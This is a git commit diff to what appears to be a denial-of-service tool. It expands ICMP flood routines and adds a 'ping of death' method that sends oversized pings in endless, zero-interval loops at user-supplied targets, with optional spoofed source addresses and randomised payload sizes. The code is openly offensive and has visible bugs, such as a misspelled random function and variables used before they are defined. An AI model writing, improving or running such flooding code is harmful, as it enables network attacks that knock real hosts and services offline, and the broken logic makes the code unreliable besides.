cb19a62bd225db55d36f059334420bfbffe000f8
Riccardo <134144784+riccio8@users.noreply.github.com>
2024-08-06 16:37:33 +0200

    Update test_lib.py

--- lib/test_lib.py
+++ lib/test_lib.py
@@ -1,5 +1,6 @@
 import requests as res
 import socket as sockk
+import random
 import time
 import ping3
 import platform
@@ -24,13 +25,25 @@ class VolumeBasedAttack:
         if platform.system() == 'Linux':
             wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
             if wifi.lower() == 'y':
-                for i in vector:
-                    ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
+                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
+                if bytes_s == 'y': 
+                    for i in vector:
+                        bytes_size = random.randit(56, 65500)
+                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
+                else:
+                    for i in vector:
+                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
             else:
                 addre = input("You can also choose a source address, do you want to? (y/n) \n")
                 if addre.lower() == 'y':
                     sources = input("Write the IP address(es): \n").split(" ")
-                    for i in vector:
+                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
+                    if bytes_s == 'y': 
+                        for i in vector:
+                            for ad in sources:
+                                bytes_size = random.randit(56, 65500)
+                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
+                    else:
                         for ad in sources:
                             ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
                 else:
@@ -41,10 +54,17 @@ class VolumeBasedAttack:
             response = input("You can choose a source address, do you want to? (y/n) \n")
             if response.lower() == 'y':
                 sources = input("Write the IP address(es): \n").split(" ")
-                print("ICMP attack with source address ", sources)
-                for i in vector:
-                    for ad in sources:
-                        ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
+                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
+                if bytes_s == 'y': 
+                    print("ICMP attack with source address ", sources)
+                    for i in vector:
+                        bytes_size = random.randit(56, 65500)
+                        for ad in sources:
+                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
+                else:
+                    for i in vector:
+                        for ad in sources:
+                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
             else:
                 print("No source address selected.\n")
                 for i in vector:
@@ -52,12 +72,70 @@ class VolumeBasedAttack:
 
 class ProtocolAttack:
     @staticmethod
-    def syn_flood(vector: list, bye: bytes, port: int):
-        print(f"SYN flood attack on {vector} with {len(bye)} bytes")
+    def pof(vector: list, bye: bytes):
+        print("ping of death metod is a type of attack like icmp, but with more bytes, from 65501 to 65535")
+        bye = int(bye)
+        if platform.system() == 'Linux':
+            wifi = input("In Linux, you can also use wifi in ping mode, do you want to? (y/n) \n")
+            if wifi.lower() == 'y':
+                bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
+                if bytes_s == 'y': 
+                    print("ICMP attack with source address ", sources)
+                    for i in vector:
+                        bytes_size = random.randit(65500, 65535)
+                        ping3.verbose_ping(i, interface='wifi0', size=bytes_size, count=0, interval=0)
+                else:
+                    for i in vector:
+                        ping3.verbose_ping(i, interface='wifi0', size=bye, count=0, interval=0)
+            else:
+                addre = input("You can also choose a source address, do you want to? (y/n) \n")
+                if addre.lower() == 'y':
+                    sources = input("Write the IP address(es): \n").split(" ")
+                    bytes_s = input("u can also send casual bytes, from 56 to 65500, u want to? (y/n) \n")
+                    if bytes_s == 'y': 
+                        print("ICMP attack with source address ", sources)
+                        for i in vector:
+                            bytes_size = random.randit(65500, 65535)
+                            for ad in sources:
+                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
+                    else:
+                        for i in vector:
+                            for ad in sources:
+                                ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
+                                
+                else:
+                    for i in vector:
+                        ping3.verbose_ping(i, size=bye, count=0, interval=0)
+
+        elif platform.system() == 'Windows':
+            response = input("You can choose a source address, do you want to? (y/n) \n")
+            if response.lower() == 'y':
+                sources = input("Write the IP address(es): \n").split(" ")
+                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
+                if bytes_s == 'y': 
+                    print("pof attack with source address ", sources)
+                    for i in vector:
+                        bytes_size = random.randit(65500, 65535)
+                        for ad in sources:
+                            ping3.verbose_ping(i, size=bytes_size, count=0, src_addr=ad, interval=0)
+                else:
+                    for i in vector:
+                        for ad in sources:
+                            ping3.verbose_ping(i, size=bye, count=0, src_addr=ad, interval=0)
+            else:
+                print("No source address selected.\n")
+                bytes_s = input("u can also send casual bytes, from 65500 to 65535, u want to? (y/n) \n")
+                if bytes_s == 'y': 
+                    bytes_size = random.randit(65500, 65535)
+                    for i in vector:
+                        ping3.verbose_ping(i, size=bytes_size, count=0, interval=0)
+                else:
+                    for i in vector:
+                        ping3.verbose_ping(i, size=bye, count=0, interval=0)
 
     @staticmethod
-    def pod(vector: list, bye: bytes, port: int):
-        print(f"POD attack on {vector} with {len(bye)} bytes")
+    def syn_flood(vector: list, bye: bytes, port: int):
+        print(f"syn_flood attack on {vector} with {len(bye)} bytes")
 
 class ApplicationLayerAttack:
     @staticmethod
